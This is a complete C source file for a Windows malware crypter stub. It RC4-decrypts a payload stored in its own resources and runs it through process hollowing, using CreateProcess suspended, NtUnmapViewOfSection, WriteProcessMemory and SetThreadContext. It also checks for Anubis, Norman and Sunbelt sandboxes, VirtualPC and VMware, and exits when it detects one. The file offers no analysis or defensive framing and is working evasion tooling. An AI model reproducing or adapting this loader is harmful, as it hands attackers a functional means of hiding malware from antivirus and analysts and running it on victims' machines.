#include <windows.h>
#include <winnt.h>
#include <tlhelp32.h> // comment this line if you don't want to include anti-anubis

typedef BOOL (WINAPI *_CreateProcess)(
  LPCTSTR lpApplicationName,
  LPTSTR lpCommandLine,
  LPSECURITY_ATTRIBUTES lpProcessAttributes,
  LPSECURITY_ATTRIBUTES lpThreadAttributes,
  BOOL bInheritHandles,
  DWORD dwCreationFlags,
  LPVOID lpEnvironment,
  LPCTSTR lpCurrentDirectory,
  LPSTARTUPINFO lpStartupInfo,
  LPPROCESS_INFORMATION lpProcessInformation
);

typedef LONG (WINAPI *_NtUnmapViewOfSection)(
  HANDLE ProcessHandle,
  PVOID BaseAddress
);

typedef LPVOID (WINAPI *_VirtualAllocEx)(
  HANDLE hProcess,
  LPVOID lpAddress,
  SIZE_T dwSize,
  DWORD flAllocationType,
  DWORD flProtect
);

typedef BOOL (WINAPI *_WriteProcessMemory)(
  HANDLE hProcess,
  LPVOID lpBaseAddress,
  LPCVOID lpBuffer,
  SIZE_T nSize,
  SIZE_T* lpNumberOfBytesWritten
);

typedef BOOL (WINAPI *_GetThreadContext)(
  HANDLE hThread,
  LPCONTEXT lpContext
);

typedef BOOL (WINAPI *_SetThreadContext)(
  HANDLE hThread,
  const CONTEXT* lpContext
);

typedef DWORD (WINAPI *_ResumeThread)(
  HANDLE hThread
);

PIMAGE_DOS_HEADER pidh;
PIMAGE_NT_HEADERS pinh;
PIMAGE_SECTION_HEADER pish;

DWORD dwFileSize;
LPBYTE lpFileBuffer;

bool IsAnubis()
{
	PROCESSENTRY32 pe32;
	pe32.dwSize = sizeof(PROCESSENTRY32);
	DWORD PID = 0, PPID = 0, expPID = 0;
	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if(Process32First(hSnapshot, &pe32))
	{
		while(Process32Next(hSnapshot, &pe32))
		{
			PID = pe32.th32ProcessID;
			if(PID == GetCurrentProcessId())
			{
				PPID = pe32.th32ParentProcessID;
			}
			if(!strcmp(pe32.szExeFile, "explorer.exe")) 
			{
				expPID = pe32.th32ProcessID;
			}
		}
		CloseHandle(hSnapshot);
	}
	if(PPID != expPID)
	{
		return TRUE;
	}
	else
	{
		return FALSE;
	}
}

bool IsNormanSandBox()
{
	CHAR szUserName[MAX_PATH];
	DWORD dwUserNameSize = sizeof(szUserName);
	GetUserName(szUserName, &dwUserNameSize);
	if(!strcmp(szUserName, "CurrentUser"))
	{
		return TRUE;
	}
	else
	{
		return FALSE;
	}
}

bool IsSunbeltSandBox()
{
	CHAR szFileName[MAX_PATH];
	GetModuleFileName(NULL, szFileName, MAX_PATH);
	if(!strcmp(szFileName, "C:\\file.exe"))
	{
		return TRUE;
	}
	else
	{
		return FALSE;
	}
}

bool IsVirtualPC()
{
	__try
	{
		__asm
		{
			mov eax, 1
			_emit 0x0F
			_emit 0x3F
			_emit 0x07
			_emit 0x0B
			_emit 0xC7
			_emit 0x45
			_emit 0xFC
			_emit 0xFF
			_emit 0xFF
			_emit 0xFF
			_emit 0xFF
		}
	}
	__except(1)
	{
		return FALSE;
	}
	return TRUE;
}

bool IsVMware()
{
	DWORD _EBX;
	__try
	{
		__asm
		{
			push ebx
			mov eax, 0x564D5868
			mov ebx, 0x8685D465
			mov ecx, 0x0A
			mov dx, 0x5658
			in eax, dx
			mov _EBX, ebx
			pop ebx
		}
	}
	__except(1)
	{
		return FALSE;
	}
	return _EBX == 0x564D5868;
}

VOID InjectPE(LPSTR szProcessName, LPBYTE lpBuffer)
{
	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	CONTEXT ctx;
	memset(&si, 0, sizeof(si));
	si.cb = sizeof(STARTUPINFO);
	ctx.ContextFlags = CONTEXT_FULL;
	pidh = (PIMAGE_DOS_HEADER)&lpBuffer[0];
	if(pidh->e_magic != IMAGE_DOS_SIGNATURE)
	{
		return;
	}
	pinh = (PIMAGE_NT_HEADERS)&lpBuffer[pidh->e_lfanew];
	if(pinh->Signature != IMAGE_NT_SIGNATURE)
	{
		return;
	}
	_CreateProcess __CreateProcess = NULL;
	__CreateProcess = (_CreateProcess)GetProcAddress(GetModuleHandle("kernel32.dll"), "CreateProcessA");
	_NtUnmapViewOfSection __NtUnmapViewOfSection = NULL;
	__NtUnmapViewOfSection = (_NtUnmapViewOfSection)GetProcAddress(GetModuleHandle("ntdll.dll"), "NtUnmapViewOfSection");
	_VirtualAllocEx __VirtualAllocEx = NULL;
	__VirtualAllocEx = (_VirtualAllocEx)GetProcAddress(GetModuleHandle("kernel32.dll"), "VirtualAllocEx");
	_WriteProcessMemory __WriteProcessMemory = NULL;
	__WriteProcessMemory = (_WriteProcessMemory)GetProcAddress(GetModuleHandle("kernel32.dll"), "WriteProcessMemory");
	_GetThreadContext __GetThreadContext = NULL;
	__GetThreadContext = (_GetThreadContext)GetProcAddress(GetModuleHandle("kernel32.dll"), "GetThreadContext");
	_SetThreadContext __SetThreadContext = NULL;
	__SetThreadContext = (_SetThreadContext)GetProcAddress(GetModuleHandle("kernel32.dll"), "SetThreadContext");
	_ResumeThread __ResumeThread = NULL;
	__ResumeThread = (_ResumeThread)GetProcAddress(GetModuleHandle("kernel32.dll"), "ResumeThread");
	__CreateProcess(NULL, szProcessName, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
	__NtUnmapViewOfSection(pi.hProcess, (PVOID)pinh->OptionalHeader.ImageBase);
	__VirtualAllocEx(pi.hProcess, (LPVOID)pinh->OptionalHeader.ImageBase, pinh->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	__WriteProcessMemory(pi.hProcess, (LPVOID)pinh->OptionalHeader.ImageBase, &lpBuffer[0], pinh->OptionalHeader.SizeOfHeaders, NULL);
	for(INT i = 0; i < pinh->FileHeader.NumberOfSections; i++)
	{
		pish = (PIMAGE_SECTION_HEADER)&lpBuffer[pidh->e_lfanew + sizeof(IMAGE_NT_HEADERS) + sizeof(IMAGE_SECTION_HEADER) * i];
		__WriteProcessMemory(pi.hProcess, (LPVOID)(pinh->OptionalHeader.ImageBase + pish->VirtualAddress), &lpBuffer[pish->PointerToRawData], pish->SizeOfRawData, NULL);
	}
	__GetThreadContext(pi.hThread, &ctx);
	ctx.Eax = pinh->OptionalHeader.ImageBase + pinh->OptionalHeader.AddressOfEntryPoint;
	__SetThreadContext(pi.hThread, &ctx);
	__ResumeThread(pi.hThread);
}

LPBYTE RC4(LPBYTE lpBuf, LPBYTE lpKey, DWORD dwBufLen, DWORD dwKeyLen)
{
	INT a, b = 0, s[256];
	BYTE swap;
	DWORD dwCount;
	for(a = 0; a < 256; a++)
	{
		s[a] = a;
	}
	for(a = 0; a < 256; a++)
	{
		b = (b + s[a] + lpKey[a % dwKeyLen]) % 256;
		swap = s[a];
		s[a] = s[b];
		s[b] = swap;
	}
	for(dwCount = 0; dwCount < dwBufLen; dwCount++)
	{
		a = (a + 1) % 256;
		b = (b + s[a]) % 256;
		swap = s[a];
		s[a] = s[b];
		s[b] = swap;
		lpBuf[dwCount] ^= s[(s[a] + s[b]) % 256];
	}
	return lpBuf;
}

int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
	HANDLE hMutex;
	hMutex = OpenMutex(MUTEX_ALL_ACCESS, FALSE, "m_Stub");
	if(hMutex == NULL)
	{
		hMutex = CreateMutex(NULL, FALSE, "m_Stub");
	}
	else
	{
		return 0;
	}
	// anti-anubis ->
	if(IsAnubis())
	{
		return 0;
	}
	// <- anti-anubis
	// anti-normansandbox ->
	if(IsNormanSandBox())
	{
		return 0;
	}
	// <- anti-normansandbox
	// anti-sunbeltsandbox ->
	if(IsSunbeltSandBox())
	{
		return 0;
	}
	// <- anti-sunbeltsandbox
	// anti-virtualpc ->
	if(IsVirtualPC())
	{
		return 0;
	}
	// <- anti-virtualpc
	// anti-vmware ->
	if(IsVMware())
	{
		return 0;
	}
	// <- anti-vmware
	CHAR szFileName[MAX_PATH];
	GetModuleFileName(NULL, szFileName, MAX_PATH);
	HRSRC hRsrc;
	hRsrc = FindResource(NULL, MAKEINTRESOURCE(150), RT_RCDATA);
	if(hRsrc == NULL)
	{
		return 0;
	}
	DWORD dwFileSize;
	dwFileSize = SizeofResource(NULL, hRsrc);
	HGLOBAL hGlob;
	hGlob = LoadResource(NULL, hRsrc);
	if(hGlob == NULL)
	{
		return 0;
	}
	LPBYTE lpFile;
	lpFile = (LPBYTE)LockResource(hGlob);
	if(lpFile == NULL)
	{
		return 0;
	}
	hRsrc = FindResource(NULL, MAKEINTRESOURCE(151), RT_RCDATA);
	if(hRsrc == NULL)
	{
		return 0;
	}
	DWORD dwKeySize;
	dwKeySize = SizeofResource(NULL, hRsrc);
	hGlob = LoadResource(NULL, hRsrc);
	if(hGlob == NULL)
	{
		return 0;
	}
	LPBYTE lpKey;
	lpKey = (LPBYTE)LockResource(hGlob);
	if(lpKey == NULL)
	{
		return 0;
	}
	InjectPE(szFileName, RC4(&lpFile[0], &lpKey[0], dwFileSize, dwKeySize));
	return 0;
}